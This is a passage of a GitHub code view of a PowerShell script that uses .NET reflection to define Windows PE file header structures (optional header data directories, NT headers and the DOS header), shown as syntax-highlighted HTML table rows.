          <td id="LC428" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ResourceTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">112</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L429" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="429"></td>
          <td id="LC429" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ExceptionTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">120</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L430" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="430"></td>
          <td id="LC430" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>CertificateTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">128</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L431" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="431"></td>
          <td id="LC431" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>BaseRelocationTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">136</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L432" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="432"></td>
          <td id="LC432" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Debug<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">144</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L433" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="433"></td>
          <td id="LC433" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Architecture<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">152</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L434" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="434"></td>
          <td id="LC434" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>GlobalPtr<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">160</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L435" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="435"></td>
          <td id="LC435" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>TLSTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">168</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L436" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="436"></td>
          <td id="LC436" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>LoadConfigTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">176</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L437" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="437"></td>
          <td id="LC437" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>BoundImport<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">184</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L438" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="438"></td>
          <td id="LC438" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IAT<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">192</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L439" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="439"></td>
          <td id="LC439" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>DelayImportDescriptor<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">200</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L440" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="440"></td>
          <td id="LC440" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>CLRRuntimeHeader<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">208</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L441" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="441"></td>
          <td id="LC441" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Reserved<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">216</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L442" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="442"></td>
          <td id="LC442" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_OPTIONAL_HEADER32</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L443" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="443"></td>
          <td id="LC443" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_OPTIONAL_HEADER32 <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_OPTIONAL_HEADER32</span></td>
        </tr>
        <tr>
          <td id="L444" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="444"></td>
          <td id="LC444" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L445" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="445"></td>
          <td id="LC445" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_NT_HEADERS64</span></td>
        </tr>
        <tr>
          <td id="L446" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="446"></td>
          <td id="LC446" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L447" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="447"></td>
          <td id="LC447" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_NT_HEADERS64<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">264</span>)</td>
        </tr>
        <tr>
          <td id="L448" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="448"></td>
          <td id="LC448" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Signature<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L449" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="449"></td>
          <td id="LC449" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>FileHeader<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_FILE_HEADER</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L450" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="450"></td>
          <td id="LC450" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>OptionalHeader<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_OPTIONAL_HEADER64</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L451" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="451"></td>
          <td id="LC451" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_NT_HEADERS64</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L452" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="452"></td>
          <td id="LC452" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_NT_HEADERS64 <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_NT_HEADERS64</span></td>
        </tr>
        <tr>
          <td id="L453" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="453"></td>
          <td id="LC453" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L454" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="454"></td>
          <td id="LC454" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_NT_HEADERS32</span></td>
        </tr>
        <tr>
          <td id="L455" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="455"></td>
          <td id="LC455" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L456" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="456"></td>
          <td id="LC456" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_NT_HEADERS32<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">248</span>)</td>
        </tr>
        <tr>
          <td id="L457" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="457"></td>
          <td id="LC457" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Signature<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L458" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="458"></td>
          <td id="LC458" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>FileHeader<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_FILE_HEADER</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L459" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="459"></td>
          <td id="LC459" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>OptionalHeader<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_OPTIONAL_HEADER32</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L460" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="460"></td>
          <td id="LC460" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_NT_HEADERS32</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L461" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="461"></td>
          <td id="LC461" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_NT_HEADERS32 <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_NT_HEADERS32</span></td>
        </tr>
        <tr>
          <td id="L462" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="462"></td>
          <td id="LC462" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L463" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="463"></td>
          <td id="LC463" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_DOS_HEADER</span></td>
        </tr>
        <tr>
          <td id="L464" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="464"></td>
          <td id="LC464" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L465" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="465"></td>
          <td id="LC465" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_DOS_HEADER<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">64</span>)</td>
        </tr>
        <tr>
          <td id="L466" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="466"></td>
          <td id="LC466" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_magic<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L467" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="467"></td>
          <td id="LC467" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_cblp<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L468" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="468"></td>
          <td id="LC468" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_cp<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L469" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="469"></td>
          <td id="LC469" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_crlc<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L470" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="470"></td>
          <td id="LC470" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_cparhdr<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L471" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="471"></td>
          <td id="LC471" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_minalloc<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L472" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="472"></td>
          <td id="LC472" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_maxalloc<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L473" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="473"></td>
          <td id="LC473" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_ss<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L474" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="474"></td>
          <td id="LC474" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_sp<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L475" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="475"></td>
          <td id="LC475" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_csum<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L476" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="476"></td>
          <td id="LC476" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_ip<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L477" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="477"></td>
          <td id="LC477" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_cs<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L478" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="478"></td>
          <td id="LC478" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_lfarlc<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L479" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="479"></td>
          <td id="LC479" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_ovno<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L480" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="480"></td>
          <td id="LC480" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L481" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="481"></td>
          <td id="LC481" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$e_resField</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>e_res<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>[]]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public, HasFieldMarshal<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L482" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="482"></td>
          <td id="LC482" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ConstructorValue</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.UnmanagedType</span>]::ByValArray</td>
